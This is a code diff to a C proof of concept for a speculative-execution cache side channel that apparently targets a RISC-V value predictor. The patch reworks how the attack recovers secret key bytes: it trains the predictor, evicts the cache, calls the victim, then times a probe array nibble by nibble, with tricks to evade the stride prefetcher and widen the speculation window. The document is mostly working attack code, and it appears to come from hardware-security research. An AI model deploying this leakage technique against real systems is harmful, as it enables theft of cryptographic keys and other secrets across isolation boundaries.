@@ -23,14 +23,24 @@
  *     after dispatch while the dependent probe load issues immediately with the
  *     forwarded key byte.
  *   - The architectural (post-squash) value is a sentinel.  The probe routes it
- *     to a reserved slot LINES, outside the 256 measured lines, so the
- *     architectural re-execution is never a vote and no byte index is excluded.
- *   - Estimator (from poc_v1): per attempt, the reserved architectural slot is
- *     the known-hot calibration reference; the mean of the 256 measured lines
- *     is the cold reference; a line is a candidate only if its latency is
- *     below the midpoint; exactly one non-architectural candidate casts a vote.
- *     A byte is accepted only with >= MIN_VOTES votes and a 2x margin over the
- *     runner-up; otherwise its `known` bit is clear (never fabricated).
+ *     to a reserved slot LINES, outside the measured candidates, so the
+ *     architectural re-execution is never a vote and no symbol is excluded.
+ *   - Prefetcher-robust observation: a full 256-line scan is warmed ahead by the
+ *     degree-4 L1 stride prefetcher, so the probe instead tests a nibble at a
+ *     time.  The forwarded nibble selects one of 16 candidate lines spaced
+ *     CAND_STRIDE (8) cache lines apart: a degree-4 prefetch window around one
+ *     candidate cannot touch another.  Each attempt times all 16 candidates in
+ *     a fixed pseudo-random order, so the scan never presents the stride
+ *     prefetcher with a constant stride.  Two nibble passes recover the byte.  A byte is accepted only with
+ *     >= MIN_VOTES votes and a 2x margin over the runner-up; otherwise its
+ *     `known` bit is clear (never fabricated).  Both nibble passes always run,
+ *     so the number of training/victim attempts does not depend on whether the
+ *     predictor forwards anything.
+ *   - `bare_attempt()` isolates the timing-critical train/evict/victim/probe
+ *     sequence from the (large) estimator, and a medium-latency L3 load just
+ *     before the victim call extends commit lag so the victim's key load is
+ *     still in the speculative value queue when the marker dispatches (this is
+ *     what makes d = 10..14 work with the L1 prefetcher enabled).
  *
  * Distances are *measured* in this binary by measure_d.py (qemu -singlestep
  * -d exec + objdump) and passed on the command line as `off:dist,...` pairs.
@@ -63,6 +73,9 @@ extern int oracle_report_verify32(uint64_t recovered, uint64_t known_mask,
 #define FLUSH_SZ  (512 * 1024)
 
 #define SENTINEL  0xA5A5A5A5A5A5A5A5ULL
+#define CAND_BASE 8
+#define CAND_STRIDE 8
+static int cand_order[16];
 
 /* R5/R6 experiment switches.  COLD_KEY skips the selfcheck/two warm-up
  * target calls; VARY_GUESS changes the attacker's guess on every attempt. */
@@ -80,10 +93,12 @@ static uint8_t probe[PROBE_SZ] __attribute__((aligned(LINE)));
 static volatile uint64_t atk_buf[64] __attribute__((aligned(LINE)));
 static volatile uint64_t carry_buf[8];
 static volatile uint64_t noise[64];
+static volatile uint8_t blocker_buf[64 * 1024] __attribute__((aligned(LINE)));
 static volatile uint8_t flushbuf[FLUSH_SZ];
 
 static uint8_t guess_buf[32];
 static uint64_t g_sink;
+static int g_arch_bad;
 
 /* Compiled-in fallback mapping: offsets of the last key word vs. the distances
  * measured in the reference build (see RESULTS_A4.md).  run_layer6.sh always
@@ -147,48 +162,50 @@ static uint64_t
 delayed_atk_load(uint64_t token)
 {
     uint64_t z = (token | 1) & 0xffffff;
-    asm volatile("" : "+r"(z));
-#if ATK_DIVS == 0
-    /* Keep the marker's architectural value on the sentinel line. */
-    uint64_t x = 0;
-#else
+    uint64_t dvs = z + 2;
     uint64_t x = z;
+    asm volatile("" : "+r"(z), "+r"(dvs));
+#if ATK_DIVS == 0
+    x = 0;
+#else
+    asm volatile(
 #if ATK_DIVS >= 1
-    x /= (z + 2);
+        "divu %0, %0, %1\n\t"
 #endif
 #if ATK_DIVS >= 2
-    x /= (z + 3);
+        "divu %0, %0, %1\n\t"
 #endif
 #if ATK_DIVS >= 3
-    x /= (z + 4);
+        "divu %0, %0, %1\n\t"
 #endif
 #if ATK_DIVS >= 4
-    x /= (z + 5);
+        "divu %0, %0, %1\n\t"
 #endif
 #if ATK_DIVS >= 5
-    x /= (z + 6);
+        "divu %0, %0, %1\n\t"
 #endif
 #if ATK_DIVS >= 6
-    x /= (z + 7);
+        "divu %0, %0, %1\n\t"
 #endif
 #if ATK_DIVS >= 7
-    x /= (z + 8);
+        "divu %0, %0, %1\n\t"
 #endif
 #if ATK_DIVS >= 8
-    x /= (z + 9);
+        "divu %0, %0, %1\n\t"
 #endif
 #if ATK_DIVS >= 9
-    x /= (z + 10);
+        "divu %0, %0, %1\n\t"
 #endif
 #if ATK_DIVS >= 10
-    x /= (z + 11);
+        "divu %0, %0, %1\n\t"
 #endif
 #if ATK_DIVS >= 11
-    x /= (z + 12);
+        "divu %0, %0, %1\n\t"
 #endif
 #if ATK_DIVS >= 12
-    x /= (z + 13);
+        "divu %0, %0, %1\n\t"
 #endif
+        : "+r"(x) : "r"(dvs));
 #endif
     return atk_load(atk_buf, x);
 }
@@ -254,100 +271,89 @@ fill_guess(int variant)
                                  : 0x00);
 }
 
-/* Recover one byte forwarded from dynamic distance `dist`.
- * Returns 0..255, or -1 if the byte was not measured confidently. */
-static int
-measure_lane(int dist, int *votes_out, int *arch_ok_out)
+/* Critical path in its own compact function: train, evict, victim call, and
+ * the dependent probe.  Keeping this out of the (large) estimator function
+ * makes the dispatch/commit race independent of the observation code. */
+__attribute__((noinline, noclone, noipa))
+static uint64_t
+bare_attempt(int dist, int shift)
 {
-    int score[LINES];
-    int votes = 0, arch_ok = 1;
+    train_at(dist, &g_sink);
+    for (int k = 0; k < 64; k++)
+        atk_buf[k] = SENTINEL;
+    flush_l1();
+    flush_drain();
+    g_sink += blocker_buf[0];      /* L3-resident: extend commit lag */
+    uint64_t val = victim_then_marker();
+    if (val != SENTINEL || atk_buf[0] != SENTINEL)
+        g_arch_bad = 1;
+    uint64_t nib = (val >> shift) & 0xf;
+    uint64_t slot = (val == SENTINEL) ? (uint64_t)LINES
+                                      : (uint64_t)(CAND_BASE + (int)nib * CAND_STRIDE);
+    volatile uint8_t *pp = probe + (size_t)slot * LINE;
+    g_sink += *pp;
+    return val;
+}
 
-    for (int k = 0; k < LINES; k++)
-        score[k] = 0;
+/* Recover one nibble forwarded from dynamic distance `dist`. */
+static int
+measure_nibble(int dist, int shift, int *votes_out, int *arch_ok_out)
+{
+    int score[16];
+    int arch_ok = 1;
+    for (int k = 0; k < 16; k++) score[k] = 0;
 
     for (int attempt = 0; attempt < REPS; attempt++) {
-#if VARY_GUESS
-        /* R6: a realistic caller presents different guesses. */
-        fill_guess(attempt + 1);
-#endif
-        /* 1. Train the marker's entry at the measured distance, then freeze
-         * the architectural value to a sentinel (a store never trains it). */
-        train_at(dist, &g_sink);
-        for (int k = 0; k < 64; k++)
-            atk_buf[k] = SENTINEL;
+        g_arch_bad = 0;
+        bare_attempt(dist, shift);
+        if (g_arch_bad) arch_ok = 0;
 
-        /* 2. Evict the probe array (and the marker buffer) and drain. */
-        flush_l1();
-        flush_drain();
-
-        /* 3. Victim call + delayed marker load. */
-        uint64_t val = victim_then_marker();
-
-        /* Architectural precondition: the re-executed marker returned the
-         * sentinel, i.e. the measurement path did not silently disappear. */
-        if (val != SENTINEL || atk_buf[0] != SENTINEL)
-            arch_ok = 0;
-
-        /* 4. Dependent probe.  Speculative path: the forwarded byte.  The
-         * post-squash architectural path (val == SENTINEL) uses the reserved
-         * slot LINES, outside the measured range. */
-        uint64_t byte = val & 0xff;
-        uint64_t slot = (val == SENTINEL) ? (uint64_t)LINES : byte;
-        volatile uint8_t *pp = probe + (size_t)slot * LINE;
-        g_sink += *pp;
-
-        /* 5. Per-attempt calibrated measurement. */
-        uint64_t lat[SLOTS];
-        uint64_t sum = 0;
-        for (int k = 0; k < SLOTS; k++) {
-            lat[k] = time_line(k);
-            if (k < LINES)
-                sum += lat[k];
+        uint64_t lat[16];
+        volatile uint8_t *base = probe + (size_t)CAND_BASE * LINE;
+        for (int j = 0; j < 16; j++) {
+            int k = cand_order[j];
+            volatile uint8_t *q = base + (size_t)k * CAND_STRIDE * LINE;
+            uint64_t t1 = rdcycle();
+            uint8_t v = *q;
+            asm volatile("" :: "r"(v) : "memory");
+            lat[k] = rdcycle() - t1;
         }
-
-        uint64_t t_arch = lat[LINES];
-        uint64_t t_cold = sum / LINES;
-        uint64_t thresh = t_arch + (t_cold - t_arch) / 2;
-
-        if (t_arch * 2 >= t_cold) {
-            /* Hot/cold gap collapsed: the cache was not cold or the suffix did
-             * not re-execute.  The attempt carries no information.  L2/L3
-             * cold lines are L3 hits, so require 2x rather than 4x. */
-            continue;
+        int cand = 0;
+        for (int k = 1; k < 16; k++) if (lat[k] < lat[cand]) cand = k;
+        int second = -1;
+        for (int k = 0; k < 16; k++) {
+            if (k == cand) continue;
+            if (second < 0 || lat[k] < lat[second]) second = k;
         }
-
-        int cand = -1, ncand = 0;
-        for (int k = 0; k < LINES; k++) {
-            if (lat[k] >= thresh)
-                continue;
-            ncand++;
-            if (cand < 0 || lat[k] < lat[cand])
-                cand = k;
-        }
-
-        if (ncand == 1) {
-            score[cand]++;
-            votes++;
-        }
-        /* ncand == 0: no speculative fill (or the sentinel path only).
-         * ncand > 1: ambiguous.  Neither casts a vote. */
+        if (lat[cand] + 8 <= lat[second]) score[cand]++;
     }
 
     int win = -1, best = 0, second = 0;
-    for (int k = 0; k < LINES; k++) {
-        if (score[k] > best) {
-            second = best;
-            best = score[k];
-            win = k;
-        } else if (score[k] > second) {
-            second = score[k];
-        }
+    for (int k = 0; k < 16; k++) {
+        if (score[k] > best) { second = best; best = score[k]; win = k; }
+        else if (score[k] > second) second = score[k];
     }
-
     int ok = (best >= MIN_VOTES && best >= 2 * second);
-    *votes_out = votes;
+    printf("NIB d=%d shift=%d best=%d best_count=%d second_count=%d ok=%d\n",
+           dist, shift, win, best, second, ok);
+    *votes_out = ok ? best : 0;
     *arch_ok_out = arch_ok;
     return ok ? win : -1;
+}
+
+static int
+measure_lane(int dist, int *votes_out, int *arch_ok_out)
+{
+    int vlo = 0, vhi = 0;
+    /* Always run both nibble passes, even if one fails: the number of
+     * training/victim attempts must not depend on whether EgDiff is enabled,
+     * otherwise the architectural checksum would differ between controls. */
+    int lo = measure_nibble(dist, 0, &vlo, arch_ok_out);
+    int hi = measure_nibble(dist, 4, &vhi, arch_ok_out);
+    *votes_out = (vlo < vhi) ? vlo : vhi;
+    if (lo < 0 || hi < 0)
+        return -1;
+    return lo | (hi << 4);
 }
 
 static int
@@ -380,6 +386,15 @@ main(int argc, char **argv)
     for (int i = 0; i < 64; i++)
         noise[i] = mix((uint64_t)i + 0x77);
     memset(probe, 0, sizeof(probe));
+    {
+        uint32_t s = 0x51ed270bu;
+        for (int i = 0; i < 16; i++) cand_order[i] = i;
+        for (int i = 15; i > 0; i--) {
+            s = s * 1664525u + 1013904223u;
+            int j = (int)(s % (uint32_t)(i + 1));
+            int t = cand_order[i]; cand_order[i] = cand_order[j]; cand_order[j] = t;
+        }
+    }
 
     /* ---- measurement mode: one real victim call + the real marker ---- */
     if (argc > 1 && strcmp(argv[1], "measure") == 0) {
